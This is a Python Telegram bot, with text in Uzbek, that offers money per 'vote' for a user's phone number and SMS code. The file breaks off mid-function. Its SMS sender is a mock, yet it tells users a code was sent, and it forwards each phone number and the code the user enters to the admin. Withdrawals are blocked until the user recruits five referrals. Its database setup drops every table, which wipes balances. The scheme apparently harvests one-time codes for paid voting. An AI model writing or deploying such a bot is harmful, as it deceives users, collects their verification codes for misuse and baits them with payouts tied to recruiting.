import asyncio
import asyncpg
import os
import logging
import re
import random
import string
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from dotenv import load_dotenv
from aiohttp import web

load_dotenv()

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================= KONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
DATABASE_URL = os.getenv("DATABASE_URL")
PORT = int(os.getenv("PORT", 10000))
VOICE_PRICE = int(os.getenv("VOICE_PRICE", 50000))
MIN_WITHDRAW = int(os.getenv("MIN_WITHDRAW", 100000))
MIN_REFERRALS = int(os.getenv("MIN_REFERRALS", 5))
CODE_EXPIRE_MINUTES = int(os.getenv("CODE_EXPIRE_MINUTES", 5))
TEST_MODE = os.getenv("TEST_MODE", "false").lower() == "true"

if TEST_MODE:
    VOICE_PRICE = 100
    MIN_WITHDRAW = 100
    MIN_REFERRALS = 1

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN topilmadi!")
    exit(1)

if ADMIN_ID == 0:
    logger.error("❌ ADMIN_ID topilmadi!")
    exit(1)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()

# ================= HOLATLAR =================
user_states = {}
user_phones = {}
admin_states = {}
withdraw_states = {}

# ================= TUGMALAR =================
def get_phone_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📞 Telefon raqamni yuborish", request_contact=True)],
            [KeyboardButton(text="❌ Bekor qilish")]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def get_user_menu():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🗳️ Ovoz berish")],
            [KeyboardButton(text="💰 Balans"), KeyboardButton(text="👥 Referallar")],
            [KeyboardButton(text="💸 Yechish"), KeyboardButton(text="📜 Tarix")],
            [KeyboardButton(text="👤 Profil")]
        ],
        resize_keyboard=True
    )

def get_admin_menu():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📊 Statistika")],
            [KeyboardButton(text="📨 Barchaga xabar")],
            [KeyboardButton(text="📋 Kutayotgan kodlar")],
            [KeyboardButton(text="💸 Yechish so'rovlari")],
            [KeyboardButton(text="✅ Tasdiqlangan raqamlar")],
            [KeyboardButton(text="👥 Foydalanuvchilar")]
        ],
        resize_keyboard=True
    )

# ================= VALIDATSIYA =================
def normalize_phone(phone):
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    
    if phone.startswith('+998') and len(phone) == 13:
        return phone
    
    if phone.startswith('998') and len(phone) == 12:
        return '+' + phone
    
    if len(phone) == 9 and phone.startswith('9'):
        return '+998' + phone
    
    return None

def is_valid_phone(phone):
    normalized = normalize_phone(phone)
    if not normalized:
        return False
    
    if normalized.startswith('+998') and len(normalized) == 13:
        number = normalized[4:]
        if len(number) == 9 and number.isdigit():
            operator_codes = ['90', '91', '93', '94', '95', '97', '98', '99', '88', '33']
            return number[:2] in operator_codes
    
    return False

def generate_sms_code():
    return ''.join(random.choices(string.digits, k=6))

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

# ================= DATABASE =================
async def get_db():
    try:
        conn = await asyncpg.connect(DATABASE_URL)
        return conn
    except Exception as e:
        logger.error(f"❌ Database ulanishda xatolik: {e}")
        raise

async def init_db():
    """Barcha jadvallarni qayta yaratish"""
    conn = None
    try:
        conn = await get_db()
        
        # ===== BARCHA JADVALLARNI O'CHIRISH =====
        logger.info("🗑️ Eski jadvallar o'chirilmoqda...")
        
        await conn.execute("DROP TABLE IF EXISTS users CASCADE")
        await conn.execute("DROP TABLE IF EXISTS codes CASCADE")
        await conn.execute("DROP TABLE IF EXISTS verified_phones CASCADE")
        await conn.execute("DROP TABLE IF EXISTS transactions CASCADE")
        await conn.execute("DROP TABLE IF EXISTS withdraws CASCADE")
        await conn.execute("DROP TABLE IF EXISTS referrals CASCADE")
        
        logger.info("✅ Eski jadvallar o'chirildi")
        
        # ===== YANGI JADVALLAR =====
        logger.info("📋 Yangi jadvallar yaratilmoqda...")
        
        # 1. users
        await conn.execute("""
            CREATE TABLE users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL DEFAULT 'no_phone_yet',
                balance INTEGER DEFAULT 0,
                referral_code VARCHAR(20) UNIQUE,
                is_blocked BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # 2. codes
        await conn.execute("""
            CREATE TABLE codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP + INTERVAL '5 minutes'
            )
        """)
        
        # 3. verified_phones
        await conn.execute("""
            CREATE TABLE verified_phones (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) UNIQUE NOT NULL,
                telegram_id BIGINT NOT NULL,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # 4. transactions
        await conn.execute("""
            CREATE TABLE transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                amount INTEGER NOT NULL,
                type VARCHAR(20) DEFAULT 'deposit',
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # 5. withdraws
        await conn.execute("""
            CREATE TABLE withdraws (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                phone VARCHAR(100) NOT NULL,
                amount INTEGER NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                processed_at TIMESTAMP
            )
        """)
        
        # 6. referrals (TO'G'RI)
        await conn.execute("""
            CREATE TABLE referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT NOT NULL,
                referred_id BIGINT NOT NULL UNIQUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # ===== INDEXLAR =====
        logger.info("📊 Indexlar yaratilmoqda...")
        
        await conn.execute("CREATE INDEX idx_users_telegram_id ON users(telegram_id)")
        await conn.execute("CREATE INDEX idx_codes_status ON codes(status)")
        await conn.execute("CREATE INDEX idx_codes_telegram_id ON codes(telegram_id)")
        await conn.execute("CREATE INDEX idx_transactions_user ON transactions(telegram_id)")
        await conn.execute("CREATE INDEX idx_withdraws_status ON withdraws(status)")
        await conn.execute("CREATE INDEX idx_withdraws_telegram_id ON withdraws(telegram_id)")
        await conn.execute("CREATE INDEX idx_referrals_referrer ON referrals(referrer_id)")
        await conn.execute("CREATE INDEX idx_referrals_referred ON referrals(referred_id)")
        
        logger.info("✅ Database muvaffaqiyatli qayta yaratildi!")
        
    except Exception as e:
        logger.error(f"❌ Database init xatosi: {e}")
        raise
    finally:
        if conn:
            await conn.close()

# ================= DATABASE FUNKSIYALARI =================
async def get_user(telegram_id):
    conn = None
    try:
        conn = await get_db()
        return await conn.fetchrow(
            "SELECT * FROM users WHERE telegram_id = $1",
            telegram_id
        )
    finally:
        if conn:
            await conn.close()

async def get_referral_count(telegram_id):
    conn = None
    try:
        conn = await get_db()
        result = await conn.fetchval(
            "SELECT COUNT(*) FROM referrals WHERE referrer_id = $1",
            telegram_id
        )
        return result or 0
    finally:
        if conn:
            await conn.close()

async def is_phone_verified(phone):
    conn = None
    try:
        conn = await get_db()
        result = await conn.fetchval(
            "SELECT COUNT(*) FROM verified_phones WHERE phone = $1",
            phone
        )
        return result > 0
    finally:
        if conn:
            await conn.close()

async def add_transaction(telegram_id, amount, type='deposit', description=None):
    conn = None
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO transactions (telegram_id, amount, type, description) VALUES ($1, $2, $3, $4)",
            telegram_id, amount, type, description
        )
    finally:
        if conn:
            await conn.close()

# ================= SMS YUBORISH (MOCK) =================
async def send_sms_code(phone, code):
    logger.info(f"SMS kod {code} raqamga yuborildi: {phone}")
    
    if TEST_MODE:
        try:
            await bot.send_message(
                ADMIN_ID,
                f"🔑 Test SMS kod:\n"
                f"📞 Telefon: {phone}\n"
                f"🔑 Kod: {code}"
            )
        except:
            pass
    
    return True

# ================= 1. START =================
@dp.message(Command("start"))
async def start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"👤 /start bosildi: {telegram_id}")
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Xush kelibsiz, Admin!", reply_markup=get_admin_menu())
        return
    
    ref_code = None
    if message.text and ' ' in message.text:
        parts = message.text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            ref_code = parts[1][4:]
    
    conn = None
    try:
        conn = await get_db()
        
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, 'no_phone_yet') "
            "ON CONFLICT (telegram_id) DO NOTHING",
            telegram_id
        )
        
        user = await conn.fetchrow(
            "SELECT * FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Xatolik! Qaytadan urinib ko'ring.")
            return
        
        if user['is_blocked']:
            await message.answer("❌ Siz bloklangansiz! Admin bilan bog'laning.")
            return
        
        if not user['referral_code']:
            ref_code_new = generate_referral_code()
            await conn.execute(
                "UPDATE users SET referral_code = $1 WHERE telegram_id = $2",
                ref_code_new, telegram_id
            )
            user = await conn.fetchrow(
                "SELECT * FROM users WHERE telegram_id = $1",
                telegram_id
            )
        
        if ref_code:
            referrer = await conn.fetchrow(
                "SELECT telegram_id FROM users WHERE referral_code = $1",
                ref_code
            )
            if referrer and referrer['telegram_id'] != telegram_id:
                try:
                    await conn.execute(
                        "INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING",
                        referrer['telegram_id'], telegram_id
                    )
                    logger.info(f"✅ Referral qo'shildi: {referrer['telegram_id']} -> {telegram_id}")
                except Exception as e:
                    logger.error(f"❌ Referral qo'shishda xatolik: {e}")
        
        bot_info = await bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
        
        phone = user['phone']
        balance = user['balance']
        
        if phone == "no_phone_yet" or phone is None:
            user_states[telegram_id] = "waiting_phone"
            
            await message.answer(
                f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
                f"💰 <b>1 OVOZ = {VOICE_PRICE:,} SO'M</b>\n\n"
                f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
                f"📝 <b>Qanday ishlaydi:</b>\n"
                f"1️⃣ Telefon raqamingizni yuboring\n"
                f"2️⃣ SMS kodni kiriting\n"
                f"3️⃣ Admin tasdiqlaydi\n"
                f"4️⃣ {VOICE_PRICE:,} so'm olasiz!\n\n"
                f"👤 <b>Sizning referal link:</b>\n"
                f"<code>{ref_link}</code>\n\n"
                f"📱 <b>Telefon raqamingizni yuboring:</b>",
                reply_markup=get_phone_keyboard()
            )
        else:
            phone_verified = await is_phone_verified(phone)
            ref_count = await get_referral_count(telegram_id)
            
            status_text = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
            
            await message.answer(
                f"👋 <b>Xush kelibsiz!</b>\n\n"
                f"📱 <b>Telefon:</b> {phone}\n"
                f"📊 <b>Holat:</b> {status_text}\n"
                f"💰 <b>Balans:</b> {balance:,} so'm\n"
                f"👥 <b>Referallar:</b> {ref_count}/{MIN_REFERRALS}\n\n"
                f"👇 Pastdagi tugmalardan foydalaning:",
                reply_markup=get_user_menu()
            )
    except Exception as e:
        logger.error(f"❌ Start xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")
    finally:
        if conn:
            await conn.close()

# ================= 2. OVOZ BERISH =================
@dp.message(F.text == "🗳️ Ovoz berish")
async def vote_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    user = await get_user(telegram_id)
    
    if not user:
        await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
        return
    
    if user['is_blocked']:
        await message.answer("❌ Siz bloklangansiz!")
        return
    
    if user['phone'] != "no_phone_yet" and await is_phone_verified(user['phone']):
        await message.answer(
            "❌ Siz allaqachon ovoz bergansiz!\n"
            "Bu raqam bilan boshqa ovoz bera olmaysiz.",
            reply_markup=get_user_menu()
        )
        return
    
    user_states[telegram_id] = "waiting_phone"
    await message.answer(
        f"🗳️ <b>OVOZ BERISH</b>\n\n"
        f"💰 1 ta ovoz = {VOICE_PRICE:,} so'm\n\n"
        f"📱 Telefon raqamingizni yuboring:",
        reply_markup=get_phone_keyboard()
    )

# ================= 3-4. TELEFON RAQAM =================
@dp.message(F.contact)
async def receive_phone_contact(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
        return
    
    if user_states.get(telegram_id) != "waiting_phone":
        await message.answer("❌ Iltimos, /start yoki 🗳️ Ovoz berish tugmasini bosing!")
        return
    
    phone = message.contact.phone_number
    await process_phone(message, phone)

@dp.message(F.text == "❌ Bekor qilish")
async def cancel_action(message: types.Message):
    telegram_id = message.from_user.id
    
    user_states.pop(telegram_id, None)
    user_phones.pop(telegram_id, None)
    withdraw_states.pop(telegram_id, None)
    
    await message.answer("✅ Bekor qilindi", reply_markup=get_user_menu())

@dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_phone")
async def receive_phone_text(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        return
    
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        await message.answer(
            "❌ Noto'g'ri telefon raqam formati!\n\n"
            "To'g'ri formatlar:\n"
            "• +998901234567\n"
            "• 998901234567\n"
            "• 901234567\n\n"
            "Iltimos, qaytadan kiriting:"
        )
        return
    
    normalized_phone = normalize_phone(phone)
    await process_phone(message, normalized_phone)

async def process_phone(message: types.Message, phone: str):
    telegram_id = message.from_user.id
    
    if await is_phone_verified(phone):
        await message.answer(
            "❌ Bu telefon raqami allaqachon ishlatilgan!\n"
            "Boshqa raqam kiriting:",
            reply_markup=get_phone_keyboard()
        )
        return
    
    conn = None
    try:
        conn = await get_db()
        await conn.execute(
            "UPDATE users SET phone = $1, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = $2",
            phone, telegram_id
        )
    finally:
        if conn:
            await conn.close()
    
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    sms_code = generate_sms_code()
    await send_sms_code(phone, sms_code)
    
    if TEST_MODE:
        await message.answer(
            f"🧪 <b>TEST REJIMI</b>\n"
            f"📱 Telefon: {phone}\n"
            f"🔑 SMS Kod: <code>{sms_code}</code>\n\n"
            f"Iltimos, ushbu kodni kiriting:"
        )
    else:
        await message.answer(
            f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
            f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:\n"
            f"⏳ Kod {CODE_EXPIRE_MINUTES} daqiqada amal qiladi."
        )
    
    conn = None
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO codes (phone, code, telegram_id, status) VALUES ($1, $2, $3, 'pending')",
            phone, sms_code, telegram_id
        )
        
        await bot.send_message(
            ADMIN_ID,
            f"📱 <b>YANGI TELEFON RAQAM</b>\n\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"🔑 SMS Kod: <code>{sms_code}</code>\n"
            f"⏳ Kod kutilmoqda..."
        )
    except Exception as e:
        logger.error(f"❌ Kod saqlashda xatolik: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 5. KODNI QABUL QILISH =================
@dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    if not phone:
        await message.answer("❌ Xatolik! /start bosing")
        return
    
    if len(code) != 6 or not code.isdigit():
        await message.answer("❌ 6 xonali kod kiriting:")
        return
    
    conn = None
    try:
        conn = await get_db()
        
        await conn.execute(
            "UPDATE codes SET status = 'expired' WHERE telegram_id = $1 AND status = 'pending'",
            telegram_id
        )
        
        code_record = await conn.fetchrow(
            "SELECT * FROM codes WHERE phone = $1 AND code = $2 AND status = 'pending' AND expires_at > NOW()",
            phone, code
        )
        
        if not code_record:
            await message.answer(
                "❌ Noto'g'ri kod yoki kod muddati tugagan!\n"
                "Qaytadan urinib ko'ring."
            )
            return
        
        await conn.execute(
            "UPDATE codes SET status = 'pending_verify' WHERE id = $1",
            code_record['id']
        )
        
        await message.answer(
            "⏳ Kodingiz qabul qilindi!\nAdmin tekshirib, tasdiqlaydi...",
            reply_markup=get_user_menu()
        )
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ To'g'ri kod", callback_data=f"verify_{telegram_id}"),
                InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
            ]
        ])
        
        await bot.send_message(
            ADMIN_ID,
            f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"🔑 Kod: <code>{code}</code>\n"
            f"⏳ Muddati: {CODE_EXPIRE_MINUTES} daqiqa",
            reply_markup=keyboard
        )
        
        user_states[telegram_id] = "done"
        user_phones.pop(telegram_id, None)
        
    except Exception as e:
        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            await conn.close()

# ================= 6. ADMIN TASDIQLASH =================
@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "verify":
        telegram_id = int(data[1])
        
        conn = None
        try:
            conn = await get_db()
            
            code_record = await conn.fetchrow(
                "SELECT * FROM codes WHERE telegram_id = $1 AND status = 'pending_verify' ORDER BY id DESC LIMIT 1",
                telegram_id
            )
            
            if not code_record:
                await callback.answer("❌ Kod topilmadi!", show_alert=True)
                return
            
            if code_record['expires_at'] < datetime.now():
                await conn.execute(
                    "UPDATE codes SET status = 'expired' WHERE id = $1",
                    code_record['id']
                )
                await callback.answer("⏰ Kod muddati tugagan!", show_alert=True)
                return
            
            phone = code_record['phone']
            
            if await is_phone_verified(phone):
                await conn.execute(
                    "UPDATE codes SET status = 'rejected' WHERE id = $1",
                    code_record['id']
                )
                await callback.answer("❌ Bu raqam allaqachon ishlatilgan!", show_alert=True)
                
                try:
                    await bot.send_message(
                        telegram_id,
                        "❌ Bu telefon raqami allaqachon ishlatilgan!",
                        reply_markup=get_user_menu()
                    )
                except:
                    pass
                return
            
            await conn.execute(
                "UPDATE codes SET status = 'verified' WHERE id = $1",
                code_record['id']
            )
            
            await conn.execute(
                "INSERT INTO verified_phones (phone, telegram_id) VALUES ($1, $2)",
                phone, telegram_id
            )
            
            await conn.execute(
                "UPDATE users SET balance = balance + $1, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = $2",
                VOICE_PRICE, telegram_id
            )
            
            await conn.execute(
                "INSERT INTO transactions (telegram_id, amount, type, description) VALUES ($1, $2, 'deposit', 'Ovoz berish uchun')",
                telegram_id, VOICE_PRICE
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
                    f"💰 Hisobingizga <b>+{VOICE_PRICE:,} so'm</b> qo'shildi!",
                    reply_markup=get_user_menu()
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"✅ <b>TASDIQLANDI!</b>\n\n"
                f"👤 ID: {telegram_id}\n"
                f"📞 Tel: {phone}\n"
                f"💰 +{VOICE_PRICE:,} so'm"
            )
            await callback.answer("✅ Tasdiqlandi!")
            
        except Exception as e:
            logger.error(f"❌ Tasdiqlashda xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        conn = None
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE codes SET status = 'rejected' WHERE telegram_id = $1 AND status = 'pending_verify'",
                telegram_id
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Kod noto'g'ri!\n\n"
                    "🗳️ Qaytadan ovoz berish tugmasini bosing.",
                    reply_markup=get_user_menu()
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n👤 ID: {telegram_id}"
            )
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Rad etishda xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                await conn.close()

# ================= 7. BALANS =================
@dp.message(F.text == "💰 Balans")
async def show_balance(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    user = await get_user(telegram_id)
    
    if not user:
        await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
        return
    
    if user['is_blocked']:
        await message.answer("❌ Siz bloklangansiz!")
        return
    
    if user['phone'] == "no_phone_yet":
        await message.answer(
            "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
            "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
            reply_markup=get_user_menu()
        )
        return
    
    phone_verified = await is_phone_verified(user['phone'])
    status = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
    
    await message.answer(
        f"💳 <b>Balans</b>\n\n"
        f"📱 Telefon: {user['phone']}\n"
        f"📊 Holat: {status}\n"
        f"💰 Balans: {user['balance']:,} so'm",
        reply_markup=get_user_menu()
    )

# ================= 8. YECHISH =================
@dp.message(F.text == "💸 Yechish")
async def withdraw_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    user = await get_user(telegram_id)
    
    if not user:
        await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
        return
    
    if user['is_blocked']:
        await message.answer("❌ Siz bloklangansiz!")
        return
    
    if user['phone'] == "no_phone_yet":
        await message.answer(
            "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
            "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
            reply_markup=get_user_menu()
        )
        return
    
    if not await is_phone_verified(user['phone']):
        await message.answer(
            "❌ Telefon raqamingiz hali tasdiqlanmagan!\n"
            "Admin tasdiqlashini kuting.",
            reply_markup=get_user_menu()
        )
        return
    
    balance = user['balance']
    
    if balance < MIN_WITHDRAW:
        await message.answer(
            f"❌ Balans: {balance:,} so'm\n"
            f"💰 Yechish uchun {MIN_WITHDRAW:,} so'm kerak!\n"
            f"Yana {MIN_WITHDRAW - balance:,} so'm kerak.",
            reply_markup=get_user_menu()
        )
        return
    
    ref_count = await get_referral_count(telegram_id)
    
    if ref_count < MIN_REFERRALS:
        bot_info = await bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
        await message.answer(
            f"❌ <b>Yechish uchun {MIN_REFERRALS} ta do'stingiz botga start bosishi kerak!</b>\n\n"
            f"👥 Sizda: {ref_count} ta\n"
            f"🎯 Kerak: {MIN_REFERRALS} ta\n\n"
            f"🔗 <b>Referal link:</b>\n"
            f"<code>{ref_link}</code>\n\n"
            f"📤 Linkni do'stlaringizga yuboring!"
        )
        return
    
    withdraw_states[telegram_id] = "waiting_withdraw_info"
    await message.answer(
        f"✅ <b>Yechish uchun tayyormisiz!</b>\n\n"
        f"💰 Balans: {balance:,} so'm\n"
        f"👥 Referallar: {ref_count} ta\n\n"
        f"📱 Karta raqami yoki telefon raqamingizni yuboring:\n"
        f"❌ Bekor qilish uchun 'Bekor qilish' deb yozing.",
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="❌ Bekor qilish")]],
            resize_keyboard=True
        )
    )

# ================= 9. YECHISH MA'LUMOTI =================
@dp.message(lambda message: withdraw_states.get(message.from_user.id) == "waiting_withdraw_info")
async def withdraw_info(message: types.Message):
    telegram_id = message.from_user.id
    info = message.text.strip()
    
    if info == "❌ Bekor qilish":
        withdraw_states.pop(telegram_id, None)
        await message.answer("✅ Bekor qilindi", reply_markup=get_user_menu())
        return
    
    if not (re.match(r'^\d{16}$', info.replace(' ', '')) or 
            re.match(r'^\d{19}$', info.replace(' ', '')) or
            is_valid_phone(info)):
        await message.answer(
            "❌ Noto'g'ri ma'lumot!\n"
            "Karta raqami (16 xonali) yoki telefon raqami kiriting:"
        )
        return
    
    user = await get_user(telegram_id)
    
    if not user:
        await message.answer("❌ Foydalanuvchi topilmadi!", reply_markup=get_user_menu())
        withdraw_states.pop(telegram_id, None)
        return
    
    balance = user['balance']
    
    conn = None
    try:
        conn = await get_db()
        
        await conn.execute(
            "INSERT INTO withdraws (telegram_id, phone, amount, status) VALUES ($1, $2, $3, 'pending')",
            telegram_id, info, balance
        )
        
        await conn.execute(
            "UPDATE users SET balance = 0, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = $1",
            telegram_id
        )
        
        await conn.execute(
            "INSERT INTO transactions (telegram_id, amount, type, description) VALUES ($1, $2, 'withdraw', 'Pul yechish')",
            telegram_id, balance
        )
        
        await message.answer(
            f"✅ So'rov qabul qilindi!\n"
            f"💰 Summa: {balance:,} so'm\n"
            f"📱 Ma'lumot: {info}",
            reply_markup=get_user_menu()
        )
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ To'landi", callback_data=f"wdone_{telegram_id}"),
                InlineKeyboardButton(text="❌ Rad etish", callback_data=f"wreject_{telegram_id}")
            ]
        ])
        
        await bot.send_message(
            ADMIN_ID,
            f"💸 <b>YECHISH SO'ROVI</b>\n\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"📱 Ma'lumot: <code>{info}</code>\n"
            f"💰 Summa: <code>{balance:,} so'm</code>\n"
            f"👥 Referallar: {await get_referral_count(telegram_id)} ta",
            reply_markup=keyboard
        )
        
        withdraw_states.pop(telegram_id, None)
        
    except Exception as e:
        logger.error(f"❌ Yechish ma'lumot xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            await conn.close()

# ================= 10. ADMIN YECHISH =================
@dp.callback_query(lambda c: c.data.startswith(("wdone_", "wreject_")))
async def admin_withdraw_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "wdone":
        telegram_id = int(data[1])
        
        conn = None
        try:
            conn = await get_db()
            
            withdraw = await conn.fetchrow(
                "SELECT * FROM withdraws WHERE telegram_id = $1 AND status = 'pending' ORDER BY id DESC LIMIT 1",
                telegram_id
            )
            
            if not withdraw:
                await callback.answer("❌ So'rov topilmadi!", show_alert=True)
                return
            
            await conn.execute(
                "UPDATE withdraws SET status = 'completed', processed_at = CURRENT_TIMESTAMP WHERE id = $1",
                withdraw['id']
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ To'lov amalga oshirildi!\n"
                    f"💰 Summa: {withdraw['amount']:,} so'm\n"
                    f"📱 Ma'lumot: {withdraw['phone']}",
                    reply_markup=get_user_menu()
                )
            except Exception as e:
                logger.error(f"❌ Xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"✅ <b>TO'LANDI!</b>\n\n"
                f"👤 ID: {telegram_id}\n"
                f"💰 Summa: {withdraw['amount']:,} so'm\n"
                f"📱 Ma'lumot: {withdraw['phone']}"
            )
            await callback.answer("✅ To'landi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                await conn.close()
    
    elif action == "wreject":
        telegram_id = int(data[1])
        
        conn = None
        try:
            conn = await get_db()
            
            withdraw = await conn.fetchrow(
                "SELECT * FROM withdraws WHERE telegram_id = $1 AND status = 'pending' ORDER BY id DESC LIMIT 1",
                telegram_id
            )
            
            if not withdraw:
                await callback.answer("❌ So'rov topilmadi!", show_alert=True)
                return
            
            await conn.execute(
                "UPDATE withdraws SET status = 'rejected', processed_at = CURRENT_TIMESTAMP WHERE id = $1",
                withdraw['id']
            )
            
            await conn.execute(
                "UPDATE users SET balance = balance + $1, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = $2",
                withdraw['amount'], telegram_id
            )
            
            await conn.execute(
                "INSERT INTO transactions (telegram_id, amount, type, description) VALUES ($1, $2, 'refund', 'Yechish rad etildi')",
                telegram_id, withdraw['amount']
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ So'rov rad etildi!\n"
